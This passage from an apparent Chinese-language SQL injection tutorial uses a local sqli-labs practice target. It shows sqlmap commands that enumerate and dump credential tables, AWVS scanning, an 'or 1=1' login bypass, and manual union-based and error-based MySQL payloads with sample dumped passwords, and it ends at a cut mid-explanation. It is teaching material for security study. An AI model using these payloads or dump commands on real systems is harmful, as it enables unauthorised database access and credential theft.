data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NxbG1hcHByb2plY3Qvc3FsbWFw\">https://github.com/sqlmapproject/sqlmap</span></p>\n<h4 id=\"5sqlmap支持的注入技术\"><a class=\"markdownIt-Anchor\" href=\"#5sqlmap支持的注入技术\">#</a> 5.SQLMAP 支持的注入技术</h4>\n<p>​\t基于布尔的盲注：根据返回页面判断条件真假的注入。</p>\n<p>​\t基于时间的盲注：不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语 句是否执行（即页面返回时间是否增加）来判断。</p>\n<p>​\t基于报错的注入：页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>\n<p>​\t基于联合查询的注入：可以使用 UNION 的情况下的注入。</p>\n<p>​\t堆查询注入：同时执行多条语句的注入。</p>\n<h4 id=\"6sqlmap支持的数据库类型\"><a class=\"markdownIt-Anchor\" href=\"#6sqlmap支持的数据库类型\">#</a> 6.SQLMAP 支持的数据库类型</h4>\n<p>​\t主要包括一些关系型数据库（ RMDBS ） ， 如 MySQL 、Oracle 、PostgreSQL 、 Microsoft SQL Server 、Microsoft Access 、IBM DB2 、SQLite 、Firebird 、 Sybase、SAP MaxDB、Informix、HSQLDB 等</p>\n<h4 id=\"7sqlmap用法以下用windows演示\"><a class=\"markdownIt-Anchor\" href=\"#7sqlmap用法以下用windows演示\">#</a> 7.sqlmap 用法 (以下用 Windows 演示)</h4>\n<h4 id=\"71对于get请求爆破方式\"><a class=\"markdownIt-Anchor\" href=\"#71对于get请求爆破方式\">#</a> 7.1 对于 get 请求爆破方式</h4>\n<p>1.sqlmap -u URL</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span></p>\n<p>判断可注入的参数</p>\n<p>判断可以用哪种 SQL 注入技术来注入</p>\n<p>识别出所有存在的注入类型</p>\n<p>尝试去判定数据库版本、开发语言、操作系统版本</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213182954882.png\" alt=\"image-20220213182954882\"></p>\n<p>2.sqlmap -u URL --current-db 获得数据库名</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> --current-db</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183117274.png\" alt=\"image-20220213183117274\"></p>\n<p>3.sqlmap -u URL -D database --tables  获得数据库中表名</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> -D security --tables</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183308240.png\" alt=\"image-20220213183308240\"></p>\n<p>4.sqlmap -u URL -D database -T tables --columns 获得表中字段名</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> -D security -T users --columns</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183454058.png\" alt=\"image-20220213183454058\"></p>\n<p>5.sqlmap -u URL -D database -T users -C name1,name2,name3 --dump 获取每个字段中的数据</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> -D security -T users -C password,username --dump</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183651064.png\" alt=\"image-20220213183651064\"></p>\n<h4 id=\"72对于post请求爆破方式\"><a class=\"markdownIt-Anchor\" href=\"#72对于post请求爆破方式\">#</a> 7.2 对于 post 请求爆破方式</h4>\n<p>1. 保存文件方式  sqlmap -r x.txt</p>\n<p>先使用 BurpSuite 抓包，将获取内容保存到指定文件，下面将文件保存到 E://1.txt</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span>  -r E:\\1.txt</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183936861.png\" alt=\"image-20220213183936861\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213184049162.png\" alt=\"\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213184622656.png\" alt=\"image-20220213184622656\"></p>\n<p>2. 手动输入 post 参数方式  sqlmap -u URL --data “”</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span>  -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xNy9pbmRleC5waHA=\">http://192.168.1.4:18888/sqli/Less-17/index.php</span> --data “uname=admin&amp;passwd=admin&amp;submit=Submit” --current-db</p>\n<p>3. 自动搜索 post 参数方式</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span>  -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xNy9pbmRleC5waHA=\">http://192.168.1.4:18888/sqli/Less-17/index.php</span> --forms</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213185639194.png\" alt=\"image-20220213185639194\"></p>\n<h4 id=\"73对于一些较难注入的场景\"><a class=\"markdownIt-Anchor\" href=\"#73对于一些较难注入的场景\">#</a> 7.3 对于一些较难注入的场景</h4>\n<p>通过指定 level 设置，一共包含五个等级</p>\n<p>level=2 http cookie 会测试</p>\n<p>level=3 http user-agent/referer 头会测试</p>\n<p>level=5 包含的 payload 最多，会自动破解出 cookie、XFF 等头部注入，相对应他的速度也比较慢。</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> level 5</p>\n<h3 id=\"使用awvs-进行sql-inject扫描\"><a class=\"markdownIt-Anchor\" href=\"#使用awvs-进行sql-inject扫描\">#</a> 使用 AWVS 进行 sql inject 扫描</h3>\n<p>安装过程不在描述，使用 add target 输入要扫描的地址</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305141924499.png\" alt=\"image-20220305141924499\"></p>\n<p>选择扫描速度</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142112656.png\" alt=\"image-20220305142112656\"></p>\n<p>设置 user-agent 伪装</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142142802.png\" alt=\"image-20220305142142802\"></p>\n<p>可以联动被动扫描器如 xray 进行多次扫描，</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142228843.png\" alt=\"image-20220305142228843\"></p>\n<p>选择 scan</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142305286.png\" alt=\"image-20220305142305286\"></p>\n<p>发现 sql 注入，存在盲注</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142353893.png\" alt=\"image-20220305142353893\"></p>\n<p>点击可以查看详细信息和扫描过程</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142445896.png\" alt=\"image-20220305142445896\"></p>\n<h3 id=\"3sql注入基础\"><a class=\"markdownIt-Anchor\" href=\"#3sql注入基础\">#</a> 3.SQL 注入基础</h3>\n<h4 id=\"31sql前置知识\"><a class=\"markdownIt-Anchor\" href=\"#31sql前置知识\">#</a> 3.1SQL 前置知识</h4>\n<p>1.mysql 查询方式</p>\n<p>mysql 注入主要关注 MYSQL 系统数据库 <code>information_schema</code> ，关注系统数据库的表 <code>columns</code>  和 <code>schemata</code>  表以及 <code>tables</code>  表</p>\n<p><code>SCHEMATA</code>  表：提供了关于数据库的信息</p>\n<p>desc information_schema.schemata;</p>\n<p>select distinct schema_name from schemata;</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213191251636.png\" alt=\"image-20220213191251636\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213191345456.png\" alt=\"image-20220213191345456\"></p>\n<p><code>COLUMNS</code>  表：给出了表中的列信息</p>\n<p>desc information_schema.columns;</p>\n<p>select distinct column_name from information_schema.columns</p>\n<p><code>TABLES</code>  表：给出了关于数据库中的表的信息</p>\n<p>desc information_schema.tables;</p>\n<p>select distinct table_name from information_schema.tables;</p>\n<p><strong>即可以使用的查询语句为</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.select distinct schema_name from schemata; 获取数据库名(或使用函数select database();)</span><br><span class=\"line\"></span><br><span class=\"line\">2.select table_name from information_schema.tables where table_schema=&#x27;security&#x27;; 获取表名</span><br><span class=\"line\"></span><br><span class=\"line\">3.select column_name  from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;;  获取列名</span><br><span class=\"line\"></span><br><span class=\"line\">4.select username from users;  获取数据</span><br></pre></td></tr></table></figure>\n<p>2.mysql 函数</p>\n<p>常用的 mysql 函数有：</p>\n<p><code>user()</code>  用户名</p>\n<p><code>database()</code>  数据库名</p>\n<p><code>version()</code>  mysql 数据库版本</p>\n<p><code>load_file()</code>  mysql 读取本地文件的函数</p>\n<p><code>@@datadir</code>   数据库路径</p>\n<p>3.sql 常用注释</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213193633629.png\" alt=\"image-20220213193633629\"></p>\n<h4 id=\"32sql注入定义\"><a class=\"markdownIt-Anchor\" href=\"#32sql注入定义\">#</a> 3.2SQL 注入定义</h4>\n<p>SQL Injection：就是通过把 SQL 命令插入到 Web 表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。</p>\n<p>本质因为输入的数据和代码不进行区分</p>\n<p>成因未对用户提交的参数数据进行校验或有效的过滤，直接进行 SQL 语句的拼接，改变了原有 SQL 语句的语义，传进数据库解析引擎中执行。</p>\n<p>所有的输入只要和数据库进行交互的，都有可能触发 SQL 注入</p>\n<p>常见的包括：</p>\n<p>Get 参数触发 SQL 注入</p>\n<p>POST 参数触发 SQL 注入</p>\n<p>Cookie 触发 SQL 注入</p>\n<p>其他参与 sql 执行的输入都有可能进行 SQL 注入</p>\n<p>两个条件</p>\n<p>用户能够控制输入</p>\n<p>原本程序要执行的 SQL 语句，拼接了用户输入的恶意数据</p>\n<h4 id=\"32mysql注入分类\"><a class=\"markdownIt-Anchor\" href=\"#32mysql注入分类\">#</a> 3.2mysql 注入分类</h4>\n<p>1. 按照请求方法注入</p>\n<p>​\tget 型注入</p>\n<p>​\tpost 型注入</p>\n<p>2. 按照 SQL 数据类型分类</p>\n<p>​\t整形注入</p>\n<p>​\t字符型注入</p>\n<p>3. 其他类型数据类型</p>\n<p>​\t报错注入</p>\n<p>​\t双注入</p>\n<p>​\t布尔盲注</p>\n<p>​\t时间盲注</p>\n<p>​\tCookie 注入</p>\n<p>​\tUser-Agent 注入</p>\n<p><strong>手工注入过程</strong></p>\n<p>1 判断是否存在注入点；</p>\n<p>2 判断字段长度（字段数）；</p>\n<p>3 判断字段回显位置；</p>\n<p>4 判断数据库信息；</p>\n<p>5 查找数据库名；</p>\n<p>6 查找数据库表；</p>\n<p>7 查找数据库表中所有字段以及字段值；</p>\n<p>8 猜解账号密码；</p>\n<p>9 登录管理员后台。</p>\n<h5 id=\"万能密码\"><a class=\"markdownIt-Anchor\" href=\"#万能密码\">#</a> 万能密码</h5>\n<p>select * from users where  username=&quot;&quot; or 1=1 --+</p>\n<p>通过 or 的 1=1 恒为真，密码被注释，此时相当于 select * from users;</p>\n<h5 id=\"整形注入\"><a class=\"markdownIt-Anchor\" href=\"#整形注入\">#</a> 整形注入</h5>\n<p>1. 判断是否由注入 (是否未严格校验)— 第一要素</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">可控参数改变 (类似于?id=1,2,3,4) 能否影响页面结果</span><br><span class=\"line\">输入的SQL语句是否能报错，通过数据库报错看到数据库一些语句的痕迹</span><br><span class=\"line\">?id=1&#x27;   报错说明是整形注入 &#x27;</span><br><span class=\"line\">输入的SQL语句能否不报错，语句是否可以成功闭合</span><br><span class=\"line\">information_schema 包含当前数据库表名</span><br><span class=\"line\">tables 数据库中所有表，通过table_schema 和table_name 确定</span><br><span class=\"line\">通过union同时执行两条语句，但需要保证前一个表和后一个表字段数一样</span><br><span class=\"line\">因此需要判断前一个表有几列</span><br><span class=\"line\">通过#或者--+ 将后面的语句注释，使其只执行前面的语句，通过HTML实体编码将其编码#---%23</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=4 union select 1,2,3,4 #</span><br><span class=\"line\">如果提示有different columns，说明不匹配，可以使用枚举</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=4 union select 1,2,3 # </span><br><span class=\"line\">这里的1,2,3只是用于占位</span><br><span class=\"line\">将id改为前表不存在的值，使其查询结果不显示前表，同时可以查出回显位置</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,2,3 # </span><br><span class=\"line\">将后面占位符改为需要查询的语句，同时可以调换位置使其输出在正确的位置</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,user(),3 %23</span><br><span class=\"line\">寻找数据库名字</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,schema_name,3 from information_schema.schemata %23</span><br><span class=\"line\">此时只能查询出一条语句，可以使用group_concat()拼接不同列的数据</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata %23</span><br><span class=\"line\">查询当前数据库</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,database(),3  %23</span><br><span class=\"line\">查询当前数据有有哪些表，可以使用group_concat或concat,使用concat需要使用limit限制每次出数据的个数</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,group_concat(table,name),3 from information_schema.tables where table_schema = database() %23</span><br><span class=\"line\">查询表有哪些字段</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns  where table_schema = database() and table_name=&#x27;users&#x27; %23</span><br><span class=\"line\">查询用户名密码</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1, group_concat(username),group_concat(password) from security.users %23</span><br><span class=\"line\">以human_read输出user_name和password</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1, group_concat(concat_ws(&#x27;:&#x27;,username,password)),3 from security.users %23</span><br></pre></td></tr></table></figure>\n<p>2. 什么类型注入</p>\n<p>3. 语句是否能够被恶意修改 — 第二要素</p>\n<p>4. 是否能够成功执行 — 第三要素</p>\n<p>5. 获取想要数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.判断是否是整形注入，即加&#x27;判断是否可以闭合&#x27;</span><br><span class=\"line\">2.判断输入是否可以影响输出 ?id=1 and 0  ?id=1 and 1 尝试使其不报错</span><br><span class=\"line\">3.判断表有几列 union select 1,2,3 %23 或者使用order by ，按照第x列排序，可以使用二分法依次查找列数</span><br><span class=\"line\">4.使用?id=1 and 0 union select 1,2,3 %23，其中1,2,3可以用需要查询的信息替换 database()</span><br><span class=\"line\">5.查询表的详细信息?id=1 and 0 union select 1,group_concat(table_name),3  from information_schema.tables where table_schema = database() %23</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong>order by 探测列名原理：</strong></p>\n<p><strong>order by 后可以加列名，列号。比如 order by 3，按照第三列排序，因此如果第三列不存在会报错，我们可以利用这点探测列数</strong></p>\n<h5 id=\"字符型注入\"><a class=\"markdownIt-Anchor\" href=\"#字符型注入\">#</a> 字符型注入</h5>\n<p>和数字型区别：接收的参数是否有’’ ,id='<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi><msup><mi>d</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mtext>字符型，</mtext><mi>i</mi><mi>d</mi><mo>=</mo></mrow><annotation encoding=\"application/x-tex\">id&#x27;字符型，id=</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.751892em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mord\"><span class=\"mord mathnormal\">d</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord cjk_fallback\">字</span><span class=\"mord cjk_fallback\">符</span><span class=\"mord cjk_fallback\">型</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">d</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span></span></span></span>id 数字型</p>\n<p>也可以通过报错信息查看，如果在 limit 附近报错，说明是数字型，如果在 $id 中报错说明是字符型，因为多了一个’</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.使用order by判断列数</span><br><span class=\"line\">?id=1&#x27; order by 3 --+</span><br><span class=\"line\">2.使用联合查询</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select user()),(select database()) --+ </span><br><span class=\"line\">Welcome    Dhakkan</span><br><span class=\"line\">Your Login name:root@localhost</span><br><span class=\"line\">Your Password:security</span><br><span class=\"line\"></span><br><span class=\"line\">3.查找数据库中有几张表</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27;),(select database()) --+ </span><br><span class=\"line\">提示超出一行</span><br><span class=\"line\">可以使用limit 0,1，此时报出第一张表名</span><br><span class=\"line\">或者使用group_concat</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),(select database()) --+ </span><br><span class=\"line\">Welcome    Dhakkan</span><br><span class=\"line\">Your Login name:emails,referers,uagents,users</span><br><span class=\"line\">Your Password:security</span><br><span class=\"line\"></span><br><span class=\"line\">4.查找列名</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;),(select database()) --+ </span><br><span class=\"line\">Welcome    Dhakkan</span><br><span class=\"line\">Your Login name:id,username,password</span><br><span class=\"line\">Your Password:security</span><br><span class=\"line\"></span><br><span class=\"line\">4.查找password</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select group_concat(username,0x3a,password) from users),(select database()) --+</span><br><span class=\"line\">Welcome    Dhakkan</span><br><span class=\"line\">Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4</span><br><span class=\"line\">Your Password:security</span><br></pre></td></tr></table></figure>\n<p>当输入参数为字符串时，称为字符型。数字型与字符型注入最大的区别在于：数字型不需要单引号闭合，而字符串类型一般要使用单引号来闭合。</p>\n<p>字符型：select * from table where username=‘test’</p>\n<p>字符型注入最关键的是如何闭合 SQL 语句以及注释多余的代码</p>\n<p>查询内容为字符串时：select * from table where username = ‘test’</p>\n<p>测试：</p>\n<p>select * from table where username = ‘test and 1=1’ ，无法注入，“test and 1=1” 会被数据库当作查询的字符串</p>\n<p>select * from table where username = ‘test’ and ‘1’='1’ --’，必须闭合字符串才可以继续注入</p>\n<h5 id=\"报错注入\"><a class=\"markdownIt-Anchor\" href=\"#报错注入\">#</a> 报错注入</h5>\n<p>查询错误会输出相应的错误，查询正确没有对应输出</p>\n<h6 id=\"1st_latfromgeohashmysql57x\"><a class=\"markdownIt-Anchor\" href=\"#1st_latfromgeohashmysql57x\">#</a> 1.ST_LatFromGeoHash()（mysql&gt;=5.7.x）</h6>\n<p>计算纬度 hash 报错</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and ST_LatFromGeoHash(concat(0x7e,(select user()),0x7e))--+</span><br><span class=\"line\">and ST_LatFromGeoHash(user())--+  //可以对于系统命令直接查询</span><br></pre></td></tr></table></figure>\n<h6 id=\"2st_longfromgeohashmysql57x\"><a class=\"markdownIt-Anchor\" href=\"#2st_longfromgeohashmysql57x\">#</a> 2.ST_LongFromGeoHash（mysql&gt;=5.7.x）</h6>\n<p>payload</p>\n<p>#同 8 ，都使用了嵌套查询</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and ST_LongFromGeoHash(concat(0x7e,(select user()),0x7e))--+</span><br></pre></td></tr></table></figure>\n<h6 id=\"3gtid-mysql-56x-显错200\"><a class=\"markdownIt-Anchor\" href=\"#3gtid-mysql-56x-显错200\">#</a> 3.GTID (MySQL&gt;= 5.6.X - 显错 &lt;=200)</h6>\n<p>0x01 GTID</p>\n<p>GTID 是 MySQL 数据库每次提交事务后生成的一个全局事务标识符，GTID 不仅在本服务器上是唯一的，其在复制拓扑中也是唯一的</p>\n<h6 id=\"gtid_subset-和-gtid_subtract函数\"><a class=\"markdownIt-Anchor\" href=\"#gtid_subset-和-gtid_subtract函数\">#</a> GTID_SUBSET () 和 GTID_SUBTRACT () 函数</h6>\n<p>0X02 函数详解</p>\n<p>GTID_SUBSET () 和 GTID_SUBTRACT () 函数，我们知道他的输入值是 GTIDset ，当输入有误时，就会报错</p>\n<p>GTID_SUBSET (set1 , set2) - 若在 set1 中的 GTID，也在 set2 中，返回 true，否则返回 false ( set1 是 set2 的子集)<br>\n GTID_SUBTRACT (set1 , set2) - 返回在 set1 中，不在 set2 中的 GTID 集合 ( set1 与 set2 的差集)</p>\n<p>0x03 注入过程 (payload)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GTID_SUBSET函数</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;) or gtid_subset(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br><span class=\"line\"> </span><br><span class=\"line\">GTID_SUBTRACT</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;) or gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br></pre></td></tr></table></figure>\n<p>函数都是那样，只是适用的版本不同</p>\n<h6 id=\"4floor8xmysql50\"><a class=\"markdownIt-Anchor\" href=\"#4floor8xmysql50\">#</a> 4.floor（8.x&gt;mysql&gt;5.0）</h6>\n<p>利用 select count (*),(floor (rand (0)*2)) x from table group by x，导致数据库报错，通过 concat 函数，连接注入语句与 floor (rand (0)*2) 函数，实现将注入结果与报错信息回显的注入方式。</p>\n<p>基本的查询 select 不必多说，剩下的几个关键字有 count 、group by 、floor、rand。</p>\n<p>1.rand () 函数，获取一个 0-1 之间的随机数</p>\n<p>但如果给一个固定的随机种子之后 rand (0), 每次产生的值都是一样的。也可以称之为伪随机（产生的数据都是可预知的）。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235308883-1871895582.png\" alt=\"img\"></p>\n<p>2.floor（rand（0）*2）函数</p>\n<p>floor () 函数的作用就是返回小于等于括号内该值的最大整数。</p>\n<p>而 rand () 是返回 0 到 1 之间的随机数，那么 floor（rand（0））产生的数就只是 0，这样就不能实现报错的：</p>\n<p>而 rand 产生的数乘 2 后自然是返回 0 到 2 之间的随机数，再配合 floor () 就可以产生确定的两个数了。也就是 0 和 1：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235309428-1152684208.png\" alt=\"img\"></p>\n<p>并且根据固定的随机数种子 0，他每次产生的随机数列都是相同的 0 1 1 0 1 1。</p>\n<p>3.group by 函数</p>\n<p>group by 主要用来对数据进行分组（相同的分为一组，显示相同组最前的 ID）。</p>\n<p>4.count（*）函数</p>\n<p>count（*）统计结果的记录数。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235310739-413634853.png\" alt=\"img\"></p>\n<p>5. 综合使用产生报错：</p>\n<p>select count(*),floor(rand(0)*2) x from users group by x;</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235310997-244751856.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235310997-244751856.png\" alt=\"img\"></a></p>\n<p>根据前面函数，这句话就是统计后面产生随机数的种类并计算每种数量。</p>\n<p>分别产生 0 1 1 0 1 1 ，这样 0 是 2 个，1 是 4 个，但是最后却产生了报错。</p>\n<p><strong>三、报错分析</strong></p>\n<p>这个整合然后计数的过程中，中间发生了什么我们是必须要明白的。<br>\n首先 mysql 遇到该语句时会建立一个虚拟表。该虚拟表有两个字段，一个是分组的 key ，一个是计数值 count (<em>)。也就对应于实验中的 user_name 和 count (</em>)。<br>\n然后<strong>在查询数据的时候，首先查看该虚拟表中是否存在该分组，如果存在那么计数值加 1，不存在则新 